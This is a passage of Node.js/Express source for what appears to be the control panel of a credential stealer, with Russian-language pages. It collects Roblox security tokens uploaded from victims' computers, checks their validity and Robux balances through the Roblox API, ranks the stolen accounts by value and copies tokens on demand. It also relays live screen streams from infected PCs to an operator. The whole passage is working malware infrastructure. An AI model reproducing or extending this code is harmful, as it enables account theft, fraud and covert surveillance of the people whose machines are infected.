  const robuxEl = document.getElementById("robloxSpecRobux");
  const statusEl = document.getElementById("robloxSpecStatus");

  if (robuxInfo.robux !== undefined) {
    robuxRow.style.display = "flex";
    if (robuxInfo.valid === false) {
      robuxEl.textContent = "❌";
      robuxEl.style.color = "#ff1744";
      statusRow.style.display = "flex";
      statusEl.textContent = "Токен недействителен";
      statusEl.style.color = "#ff1744";
    } else {
      robuxEl.textContent = robuxInfo.robux.toLocaleString() + " R$";
      robuxEl.style.color = "#2ed573";
      if (robuxInfo.checked) {
        statusRow.style.display = "flex";
        statusEl.textContent = "Проверен: " + new Date(robuxInfo.checked).toLocaleString("ru");
        statusEl.style.color = "#57606F";
      }
    }
  } else if (roblox.security) {
    robuxRow.style.display = "flex";
    robuxEl.textContent = "⏳ Не проверен";
    robuxEl.style.color = "#ffa502";
    statusRow.style.display = "flex";
    statusEl.textContent = "Нажми «Проверить Robux»";
    statusEl.style.color = "#57606F";
  } else {
    robuxRow.style.display = "none";
    statusRow.style.display = "none";
  }

  // Set preview pane
  const pane = document.getElementById("modalPreviewPane");
  if (isImg(nm)) {
    pane.innerHTML = "<img src=\\"" + dlUrl + "\\" alt=\\"\\">";
  } else if (isVid(nm)) {
    pane.innerHTML = "<video src=\\"" + dlUrl + "\\" controls autoplay></video>";
  } else if (isAud(nm)) {
    pane.innerHTML = "<audio src=\\"" + dlUrl + "\\" controls autoplay></audio>";
  } else if (isText(nm)) {
    pane.innerHTML = "<div class=\\"modal-preview-text\\">Загрузка файла...</div>";
    fetch(dlUrl).then(res => res.text()).then(t => {
      const escaped = t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
      pane.querySelector(".modal-preview-text").innerHTML = escaped;
    }).catch(e => {
      pane.querySelector(".modal-preview-text").textContent = "Не удалось прочесть файл.";
    });
  } else {
    pane.innerHTML = "<div class=\\"card-preview-icon\\" style=\\"font-size: 7rem;\\">" + icon(nm) + "</div>";
  }
  
  // Setup actions
  document.getElementById("modalStreamBtn").onclick = function() { openStreamModal(pc.name || "Unknown"); };
  document.getElementById("modalRobuxBtn").onclick = function() { checkRobux(f.name); };
  document.getElementById("modalAiBtn").onclick = function() { analyzeFile(f.name); };
  document.getElementById("modalDeleteBtn").onclick = function() { deleteFile(f.name); };
  
  document.getElementById("fileModal").style.display = "flex";
}

function closeModal() {
  document.getElementById("fileModal").style.display = "none";
  // Stop any playing media
  document.getElementById("modalPreviewPane").innerHTML = "";
}

function openStreamModal(pcName) {
  document.getElementById("streamPcName").textContent = pcName;
  document.getElementById("streamStatus").textContent = "⏳ Подключение к стриму...";
  const img = document.getElementById("streamImg");
  img.src = "/stream/" + encodeURIComponent(pcName) + "?t=" + Date.now();
  img.onload = function() {
    document.getElementById("streamStatus").textContent = "● LIVE — стрим в реальном времени";
  };
  img.onerror = function() {
    document.getElementById("streamStatus").textContent = "❌ Стрим недоступен (приложение закрыто или не передаёт кадры)";
  };
  document.getElementById("streamModal").style.display = "flex";
}

function closeStreamModal() {
  document.getElementById("streamModal").style.display = "none";
  document.getElementById("streamImg").src = "";
}

let currentToken = "";

function copyToken() {
  if (!currentToken) return;
  navigator.clipboard.writeText(currentToken).then(function() {
    toast("📋 Токен скопирован в буфер");
  }).catch(function() {
    // Fallback
    const ta = document.createElement("textarea");
    ta.value = currentToken;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand("copy");
    document.body.removeChild(ta);
    toast("📋 Токен скопирован");
  });
}

async function deleteFile(name) {
  if (!confirm("Удалить файл?")) return;
  try {
    const r = await fetch("/files/" + encodeURIComponent(name), { method: "DELETE" });
    const d = await r.json();
    if (d.success) {
      toast("Файл удалён");
      closeModal();
      loadFiles();
    } else {
      toast("Ошибка удаления", "err");
    }
  } catch (e) {
    toast("Ошибка связи с сервером", "err");
  }
}

async function analyzeFile(name) {
  const p = document.getElementById("aiPanel");
  const b = document.getElementById("aiBody");
  p.style.display = "block";
  b.textContent = "⏳ Анализирую...";
  try {
    const r = await fetch("/analyze", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ filename: name })
    });
    const d = await r.json();
    b.textContent = d.analysis;
    toast("✅ Анализ завершён");
    loadFiles();
  } catch (e) {
    b.textContent = "❌ Ошибка анализа AI";
  }
}

async function checkRobux(name) {
  const robuxRow = document.getElementById("robloxSpecRobuxRow");
  const robuxEl = document.getElementById("robloxSpecRobux");
  const statusRow = document.getElementById("robloxSpecStatusRow");
  const statusEl = document.getElementById("robloxSpecStatus");
  robuxRow.style.display = "flex";
  robuxEl.textContent = "⏳ Проверка...";
  robuxEl.style.color = "#ffa502";
  statusRow.style.display = "flex";
  statusEl.textContent = "Запрос к Roblox API...";
  statusEl.style.color = "#ffa502";
  try {
    const r = await fetch("/robux-check-file", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ filename: name })
    });
    const info = await r.json();
    if (info.valid) {
      robuxEl.textContent = info.robux.toLocaleString() + " R$";
      robuxEl.style.color = "#2ed573";
      statusEl.textContent = "Аккаунт: " + info.username + " (ID: " + info.userId + ")";
      statusEl.style.color = "#57606F";
      toast("💰 Robux: " + info.robux.toLocaleString());
    } else {
      robuxEl.textContent = "❌";
      robuxEl.style.color = "#ff1744";
      statusEl.textContent = "Ошибка: " + (info.error || "неизвестно");
      statusEl.style.color = "#ff1744";
      toast("❌ Токен недействителен", "err");
    }
    loadFiles();
  } catch (e) {
    robuxEl.textContent = "❌";
    statusEl.textContent = "Ошибка сети: " + e.message;
    statusEl.style.color = "#ff1744";
  }
}

// ── SSE Realtime Client Setup ────────────────────────────────────────────────
function setupSSE() {
  const sse = new EventSource("/events");
  sse.onmessage = function(e) {
    try {
      const data = JSON.parse(e.data);
      if (data.event === "new_file") {
        toast("📥 Получен новый файл!");
        playChime();
        loadFiles();
      }
    } catch(err) { }
  };
  sse.onerror = function() {
    // EventSource auto-reconnects, but we can log or handle errors if needed
  };
}

loadFiles();
setupSSE();
</script>
</body>
</html>`;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  HTML: Tokens Page
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function tokensHTML(user) {
  const avatar = user === 'Shonll' ? '🦊' : '🐉';
  return `<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Рабочие токены Roblox</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #030307; --surface: rgba(18, 18, 28, 0.65); --surface-hover: rgba(25, 25, 38, 0.85);
      --border: rgba(255, 255, 255, 0.08); --accent: #7c6aff; --accent-glow: rgba(124, 106, 255, 0.25);
      --text: #f1f1f6; --text-dim: #8c8c9e; --success: #00e676; --danger: #ff1744; --gold: #ffa502;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; }
    body::before { content: ''; position: fixed; inset: -10%; width: 120%; height: 120%; background: radial-gradient(circle at 15% 20%, rgba(124,106,255,0.15) 0%, transparent 40%), radial-gradient(circle at 85% 75%, rgba(0,122,204,0.12) 0%, transparent 45%); z-index: -1; pointer-events: none; }
    header { position: sticky; top: 12px; z-index: 100; background: rgba(13, 13, 21, 0.65); backdrop-filter: blur(16px); border: 1px solid var(--border); border-radius: 16px; margin: 12px 1.5rem 0; padding: 0 1.5rem; height: 64px; display: flex; align-items: center; justify-content: space-between; box-shadow: 0 8px 32px rgba(0,0,0,0.5); }
    .logo { display: flex; align-items: center; gap: 10px; font-size: 1.15rem; font-weight: 800; background: linear-gradient(135deg, #7c6aff, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; letter-spacing: -0.5px; }
    .user-badge { display: flex; align-items: center; gap: 10px; background: rgba(255,255,255,0.03); border: 1px solid var(--border); border-radius: 999px; padding: 0.35rem 0.9rem 0.35rem 0.5rem; }
    .user-avatar { font-size: 1.3rem; }
    .user-name { font-size: 0.85rem; font-weight: 600; color: var(--text); }
    .btn-logout { margin-left: 0.6rem; background: none; border: none; color: var(--text-dim); font-size: 0.78rem; cursor: pointer; font-family: inherit; padding: 0.2rem 0.5rem; border-radius: 6px; text-decoration: none; }
    .btn-logout:hover { color: var(--danger); }
    .nav-links { display: flex; gap: 1rem; }
    .nav-link { color: var(--text-dim); text-decoration: none; font-size: 0.85rem; font-weight: 500; padding: 0.4rem 0.8rem; border-radius: 8px; transition: 0.2s; }
    .nav-link:hover { color: var(--text); background: rgba(255,255,255,0.05); }
    .nav-link.active { color: var(--accent); background: rgba(124,106,255,0.1); }

    .container { padding: 1.5rem; }
    .stats-bar { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin-bottom: 1.5rem; }
    .stat-card { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 1rem 1.25rem; transition: border-color 0.3s; }
    .stat-card:hover { border-color: rgba(124,106,255,0.3); }
    .stat-label { font-size: 0.72rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.25rem; }
    .stat-value { font-size: 1.5rem; font-weight: 700; }
    .stat-value.accent { background: linear-gradient(135deg, #7c6aff, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
    .stat-value.gold { color: var(--gold); }
    .stat-value.success { color: var(--success); }

    .controls { display: flex; gap: 1rem; align-items: center; justify-content: space-between; margin-bottom: 1.5rem; flex-wrap: wrap; }
    .sort-btn { background: var(--surface); border: 1px solid var(--border); color: var(--text); padding: 0.6rem 1.2rem; border-radius: 10px; cursor: pointer; font-family: inherit; font-size: 0.85rem; font-weight: 600; transition: 0.2s; }
    .sort-btn:hover { border-color: var(--accent); background: rgba(124,106,255,0.1); }
    .sort-btn.active { border-color: var(--accent); color: var(--accent); }

    .tokens-table { width: 100%; border-collapse: collapse; background: var(--surface); border: 1px solid var(--border); border-radius: 16px; overflow: hidden; }
    .tokens-table th, .tokens-table td { padding: 1rem; text-align: left; border-bottom: 1px solid var(--border); font-size: 0.85rem; }
    .tokens-table th { background: rgba(10,10,15,0.6); font-weight: 600; color: var(--text-dim); text-transform: uppercase; font-size: 0.72rem; letter-spacing: 0.05em; }
    .tokens-table tr:hover { background: rgba(255,255,255,0.02); }
    .tokens-table tr.invalid { opacity: 0.6; }
    .robux { font-size: 1.1rem; font-weight: 700; color: var(--success); }
    .robux.invalid { color: var(--danger); }
    .token-cell { font-family: 'Consolas', monospace; font-size: 0.7rem; color: var(--gold); max-width: 250px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
    .copy-btn { background: rgba(255,165,0,0.12); border: 1px solid rgba(255,165,0,0.25); color: var(--gold); padding: 0.3rem 0.8rem; border-radius: 6px; cursor: pointer; font-family: inherit; font-size: 0.75rem; font-weight: 600; transition: 0.2s; }
    .copy-btn:hover { background: rgba(255,165,0,0.22); }
    .badge { display: inline-block; padding: 0.2rem 0.6rem; border-radius: 6px; font-size: 0.7rem; font-weight: 600; }
    .badge-valid { background: rgba(0,230,118,0.1); color: var(--success); border: 1px solid rgba(0,230,118,0.2); }
    .badge-invalid { background: rgba(255,23,68,0.1); color: var(--danger); border: 1px solid rgba(255,23,68,0.2); }
    .loading { text-align: center; padding: 4rem; color: var(--text-dim); }
    .empty { text-align: center; padding: 4rem; color: var(--text-dim); }
    #toast { position: fixed; bottom: 1.5rem; left: 50%; transform: translateX(-50%) translateY(80px); background: rgba(13,13,21,0.9); border: 1px solid var(--border); backdrop-filter: blur(10px); border-radius: 10px; padding: 0.6rem 1.2rem; font-size: 0.82rem; transition: 0.3s; z-index: 400; }
    #toast.show { transform: translateX(-50%) translateY(0); }
    #toast.ok { border-color: var(--success); color: var(--success); }
    #toast.err { border-color: var(--danger); color: var(--danger); }
  </style>
</head>
<body>
<header>
  <div class="logo">⚡ РАБОЧИЕ ТОКЕНЫ</div>
  <div class="nav-links">
    <a href="/" class="nav-link">📁 Файлы</a>
    <a href="/tokens" class="nav-link active">🎫 Токены</a>
  </div>
  <div class="user-badge">
    <span class="user-avatar">${avatar}</span>
    <span class="user-name">${user}</span>
    <a href="/logout" class="btn-logout">Выйти</a>
  </div>
</header>

<div class="container">
  <div class="stats-bar">
    <div class="stat-card"><div class="stat-label">Всего токенов</div><div class="stat-value accent" id="sTotal">—</div></div>
    <div class="stat-card"><div class="stat-label">Рабочих</div><div class="stat-value success" id="sValid">—</div></div>
    <div class="stat-card"><div class="stat-label">Общий Robux</div><div class="stat-value gold" id="sTotalRobux">—</div></div>
    <div class="stat-card"><div class="stat-label">Средний Robux</div><div class="stat-value" id="sAvgRobux">—</div></div>
  </div>

  <div class="controls">
    <div>
      <button class="sort-btn" id="sortDesc" onclick="sortTokens('desc')">💰 Сначала больше</button>
      <button class="sort-btn" id="sortAsc" onclick="sortTokens('asc')">💰 Сначала меньше</button>
      <button class="sort-btn" id="sortDate" onclick="sortTokens('date')">📅 По дате</button>
    </div>
    <button class="sort-btn" onclick="loadTokens()" style="border-color: var(--success); color: var(--success);">↻ Обновить балансы</button>
  </div>

  <div id="tokensContainer">
    <div class="loading">⏳ Загрузка токенов...</div>
  </div>
</div>

<div id="toast"></div>

<script>
let allTokens = [];
let currentSort = 'desc';

function fmtSize(b) { if (b < 1024) return b + ' B'; if (b < 1048576) return (b/1024).toFixed(1) + ' KB'; return (b/1048576).toFixed(1) + ' MB'; }
function fmtDate(s) { return s ? new Date(s).toLocaleString('ru', { day: '2-digit', month: 'short', hour: '2-digit', minute: '2-digit' }) : '—'; }
function toast(msg, type='ok') { const t = document.getElementById('toast'); t.textContent = msg; t.className = 'show ' + type; setTimeout(() => t.className = '', 3000); }

async function loadTokens() {
  const container = document.getElementById('tokensContainer');
  container.innerHTML = '<div class="loading">⏳ Проверка токенов через Roblox API...</div>';
  try {
    const r = await fetch('/tokens-data');
    allTokens = await r.json();
    sortTokens(currentSort);
    updateStats();
    toast('✅ Балансы обновлены');
  } catch (e) {
    container.innerHTML = '<div class="empty">❌ Ошибка загрузки токенов</div>';
    toast('Ошибка загрузки', 'err');
  }
}

function updateStats() {
  const total = allTokens.length;
  const valid = allTokens.filter(t => t.valid).length;
  const totalRobux = allTokens.reduce((s, t) => s + (t.valid && t.robux !== null ? t.robux : 0), 0);
  const avg = valid > 0 ? Math.round(totalRobux / valid) : 0;
  document.getElementById('sTotal').textContent = total;
  document.getElementById('sValid').textContent = valid;
  document.getElementById('sTotalRobux').textContent = totalRobux.toLocaleString() + ' R$';
  document.getElementById('sAvgRobux').textContent = avg.toLocaleString() + ' R$';
}

function sortTokens(mode) {
  currentSort = mode;
  document.getElementById('sortDesc').className = 'sort-btn' + (mode === 'desc' ? ' active' : '');
  document.getElementById('sortAsc').className = 'sort-btn' + (mode === 'asc' ? ' active' : '');
  document.getElementById('sortDate').className = 'sort-btn' + (mode === 'date' ? ' active' : '');

  const sorted = [...allTokens].sort((a, b) => {
    if (mode === 'desc') {
      const av = a.valid && a.robux !== null ? a.robux : -1;
      const bv = b.valid && b.robux !== null ? b.robux : -1;
      return bv - av;
    }
    if (mode === 'asc') {
      const av = a.valid && a.robux !== null ? a.robux : Infinity;
      const bv = b.valid && b.robux !== null ? b.robux : Infinity;
      return av - bv;
    }
    return new Date(b.uploadedAt || 0) - new Date(a.uploadedAt || 0);
  });
  renderTokens(sorted);
}

function renderTokens(tokens) {
  const container = document.getElementById('tokensContainer');
  if (tokens.length === 0) {
    container.innerHTML = '<div class="empty">🌌 Токенов пока нет</div>';
    return;
  }

  let html = '<table class="tokens-table"><thead><tr>';
  html += '<th>Статус</th>';
  html += '<th>Никнейм</th>';
  html += '<th>UserId</th>';
  html += '<th>Robux</th>';
  html += '<th>Токен</th>';
  html += '<th>Компьютер</th>';
  html += '<th>Дата</th>';
  html += '</tr></thead><tbody>';

  for (const t of tokens) {
    const valid = t.valid;
    const robux = valid && t.robux !== null ? t.robux : null;
    const rowClass = valid ? '' : 'invalid';
    const statusBadge = valid ? '<span class="badge badge-valid">✅ Рабочий</span>' : '<span class="badge badge-invalid">❌ ' + (t.error || 'Невалид') + '</span>';
    const robuxDisplay = valid ? '<span class="robux">' + robux.toLocaleString() + ' R$</span>' : '<span class="robux invalid">—</span>';
    html += '<tr class="' + rowClass + '">';
    html += '<td>' + statusBadge + '</td>';
    html += '<td>' + (t.username || t.user || '—') + '</td>';
    html += '<td>' + (t.userId || '—') + '</td>';
    html += '<td>' + robuxDisplay + '</td>';
    html += '<td><div class="token-cell" title="' + (t.security || '') + '">' + (t.security ? t.security.substring(0, 40) + '...' : '—') + '</div></td>';
    html += '<td>' + (t.computer || '—') + '</td>';
    html += '<td>' + fmtDate(t.uploadedAt) + '</td>';
    html += '<td>' + (t.security ? '<button class="copy-btn" onclick="copyToken(' + JSON.stringify(t.security).replace(/"/g, '&quot;') + ')">📋 Копировать</button>' : '') + '</td>';
    html += '</tr>';
  }
  html += '</tbody></table>';
  container.innerHTML = html;
}

function copyToken(token) {
  if (!token) return;
  navigator.clipboard.writeText(token).then(() => toast('📋 Токен скопирован')).catch(() => {
    const ta = document.createElement('textarea'); ta.value = token; document.body.appendChild(ta); ta.select(); document.execCommand('copy'); document.body.removeChild(ta); toast('📋 Токен скопирован');
  });
}

loadTokens();
</script>
</body>
</html>`;
}

// ── Screen Stream ─────────────────────────────────────────────────────────────
const latestFrames = new Map(); // "operator|pcName" -> Buffer
const streamSockets = new Map(); // "operator|pcName" -> WebSocket

// Список активных стримов (для отладки)
app.get('/streams', requireAuth, (req, res) => {
  const result = [];
  for (const [name, ws] of streamSockets) {
    const frame = latestFrames.get(name);
    result.push({
      name,
      connected: ws.readyState === WebSocket.OPEN,
      hasFrame: !!frame,
      frameSize: frame ? frame.length : 0,
      lastFrame: frame ? new Date().toISOString() : null
    });
  }
  res.json(result);
});

// MJPEG поток экрана для браузера
app.get('/stream/:computerName', requireAuth, (req, res) => {
  const pcName = req.params.computerName;
  const frameKey = (req.authUser || req.session.user) + '|' + pcName;
  res.writeHead(200, {
    'Content-Type': 'multipart/x-mixed-replace; boundary=frame',
    'Cache-Control': 'no-cache',
    'Pragma': 'no-cache',
    'Connection': 'keep-alive'
  });

  const interval = setInterval(() => {
    const frame = latestFrames.get(frameKey);
    if (frame && !res.writableEnded) {
      try {
        res.write('--frame\r\n');
        res.write('Content-Type: image/jpeg\r\n');
        res.write('Content-Length: ' + frame.length + '\r\n\r\n');
        res.write(frame);
        res.write('\r\n');
      } catch (e) {
        clearInterval(interval);
      }
    }
  }, 100);

  req.on('close', () => clearInterval(interval));
});

function setupWebSocket(httpServer) {
  const wss = new WebSocket.Server({ server: httpServer });
  wss.on('connection', (ws) => {
    let streamKey = null;
    let pingInterval = setInterval(() => {
      if (ws.readyState === WebSocket.OPEN) ws.ping();
    }, 30000);

    ws.on('message', (data) => {
      if (Buffer.isBuffer(data)) {
        if (streamKey) latestFrames.set(streamKey, data);
      } else {
        const text = data.toString();
        if (!streamKey) {
          streamKey = text; // ожидается "operator|pcName"
          streamSockets.set(streamKey, ws);
          console.log(`[${new Date().toLocaleTimeString()}] 📺 Stream connected: ${streamKey}`);
        }
      }
    });

    ws.on('close', () => {
      clearInterval(pingInterval);
      if (streamKey) {
        streamSockets.delete(streamKey);
        console.log(`[${new Date().toLocaleTimeString()}] 📺 Stream disconnected: ${streamKey}`);
      }
    });

    ws.on('error', (err) => {
      console.log(`[${new Date().toLocaleTimeString()}] 📺 Stream error: ${err.message}`);
    });
  });
}

// ── Start ─────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 25565;
const server = app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
setupWebSocket(server);
